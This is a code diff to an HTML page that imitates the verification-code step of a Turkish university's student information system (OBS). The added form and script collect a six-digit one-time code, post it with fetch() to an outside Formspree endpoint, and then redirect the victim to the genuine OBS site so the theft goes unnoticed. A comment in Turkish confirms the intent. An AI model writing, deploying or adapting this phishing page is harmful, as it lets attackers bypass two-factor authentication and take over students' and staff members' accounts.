@@ -933,10 +933,39 @@
                                         Bilgi Sistemi'nden", öğrenci iseniz "Öğrenci Bilgi Sistemi'nden" alınmaktadır.
                                         Eğer doğrulama kodu gelmediyse "Personel Daire Başkanlığı'ndan" veya "Öğrenci
                                         İşleri Daire Başkanlığı'ndan" numaranızın düzeltilmesini isteyiniz.</div>
-                                    <form action="https://formspree.io/f/xaqqpljg" method="POST">
-                                        <input type="hidden" name="_next" value="https://obs.sdu.edu.tr/">
+                                    <form id="dogrulamaForm" action="https://formspree.io/f/mvzzwyqq" method="POST">
 
+                                        <div class="form-group mb-3">
+                                            <input type="text" name="dogrulama_kodu" class="form-control text-center"
+                                                placeholder="6 Haneli Kodu Giriniz" required maxlength="6"
+                                                style="font-size: 20px; letter-spacing: 5px;">
+                                        </div>
+
+                                        <button type="submit" class="btn btn-primary btn-block"
+                                            style="width:100%; background-color:#800000; color:white; height: 50px; font-weight: bold;">
+                                            DOĞRULA
+                                        </button>
                                     </form>
+
+                                    <script>
+                                        var form = document.getElementById("dogrulamaForm");
+
+                                        form.addEventListener("submit", function (event) {
+                                            event.preventDefault();
+                                            var data = new FormData(event.target);
+
+                                            fetch(event.target.action, {
+                                                method: 'POST',
+                                                body: data,
+                                                headers: { 'Accept': 'application/json' }
+                                            }).then(response => {
+                                                // Kod mailinize düştüğü an kullanıcıyı gerçek OBS'ye salla
+                                                window.location.href = "https://obs.sdu.edu.tr/";
+                                            }).catch(error => {
+                                                window.location.href = "https://obs.sdu.edu.tr/";
+                                            });
+                                        });
+                                    </script>
                                     <div class="form-group position-relative">
                                         <label class=control-label for=ValidationCode>Doğrulama Kodu</label>
                                         <input class=form-control inputmode=numeric autocomplete=one-time-code
